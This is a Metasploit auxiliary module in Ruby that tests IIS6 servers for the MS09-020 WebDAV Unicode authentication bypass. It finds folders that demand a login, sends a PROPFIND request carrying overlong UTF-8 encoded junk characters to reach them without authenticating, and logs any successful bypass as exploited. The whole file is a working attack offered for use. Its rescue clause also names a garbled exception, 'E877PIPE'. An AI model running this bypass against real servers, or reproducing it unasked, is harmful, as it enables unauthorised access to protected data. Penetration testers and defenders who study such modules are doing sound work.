##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/proto/http'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::WmapScanDir
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'   		=> 'MS09-020 IIS6 WebDAV Unicode Authentication Bypass',
      'Description'	=> %q{
        This module attempts to to bypass authentication using the WebDAV IIS6
        Unicode vulnerability discovered by Kingcope. The vulnerability appears
        to be exploitable where WebDAV is enabled on the IIS6 server, and any
        protected folder requires either Basic, Digest or NTLM authentication.
      },
      'Author' 		=> [ 'et', 'aushack' ],
      'License'		=> MSF_LICENSE,
      'References'   =>
        [
          [ 'MSB', 'MS09-020' ],
          [ 'CVE', '2009-1535' ],
          [ 'CVE', '2009-1122' ],
          [ 'OSVDB', '54555' ],
          [ 'BID', '34993' ],
        ]
      ))

    register_options(
      [
        OptString.new('PATH', [ true,  "The path to protected folder", '/'])
      ])

  end

  def run_host(ip)
    tpath = normalize_uri(datastore['PATH'])
    if tpath[-1,1] != '/'
      tpath += '/'
    end

    vhost = datastore['VHOST'] || wmap_target_host
    prot  = datastore['SSL'] ? 'https' : 'http'

    webdav_req = '<?xml version="1.0" encoding="utf-8"?><propfind xmlns="DAV:"><prop><getcontentlength xmlns="DAV:"/>' +
      '<getlastmodified xmlns="DAV:"/><executable xmlns="http://apache.org/dav/props/"/><resourcetype xmlns="DAV:"/>' +
      '<checked-in xmlns="DAV:"/><checked-out xmlns="DAV:"/></prop></propfind>'

    begin
      res = send_request_cgi({
        'uri'  		=>  tpath,
        'method'   	=> 'PROPFIND',
        'ctype'		=> 'application/xml',
        'headers' 	=>
          {
          },
        'data'		=> webdav_req + "\r\n\r\n",
      }, 20)

      if(not res)
        print_error("NO Response.")
      elsif (res.code.to_i == 401)
        print_status("#{rhost}:#{rport} Confirmed protected folder #{wmap_base_url}#{tpath} #{res.code} (#{wmap_target_host})")
        print_status("#{rhost}:#{rport} \tTesting for unicode bypass in IIS6 with WebDAV enabled using PROPFIND request.")

        cset  = %W{ & ^ % $ # @ ! }
        buff  = ''
        blen  = rand(16)+1
        while(buff.length < blen)
          buff << cset[ rand(cset.length) ]
        end
        bogus = Rex::Text.uri_encode(Rex::Text.to_unicode( buff, 'utf-8', 'overlong', 2))

        res = send_request_cgi({
          'uri'  		=>  tpath + bogus+'/',
          'method'   	=> 'PROPFIND',
          'ctype'		=> 'application/xml',
          'headers' 	=>
            {
              #'Translate'	 => 'f', # Not required in PROPFIND, only GET - aushack 20091518
            },
          'data'		=> webdav_req + "\r\n\r\n",
        }, 20)

        if (res.code.to_i == 207)
          print_good("#{rhost}:#{rport} \tFound vulnerable WebDAV Unicode bypass.  #{wmap_base_url}#{tpath}#{bogus}/ #{res.code} (#{wmap_target_host})")


          report_vuln(
            {
              :host	=> ip,
              :port	=> rport,
              :proto	=> 'tcp',
              :sname  => ssl ? 'https' : 'http',
              :name	=> self.name,
              :info	=> "Module #{self.fullname} bypassed authentication with #{tpath}#{bogus} (response code #{res.code})",
              :refs   => self.references,
              :exploited_at => Time.now.utc
            }
          )

        end
      else
        print_error("#{rhost}:#{rport} Folder does not require authentication. [#{res.code}]")
      end
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
    rescue ::Timeout::Error, ::Errno::E877PIPE
    end
  end
end
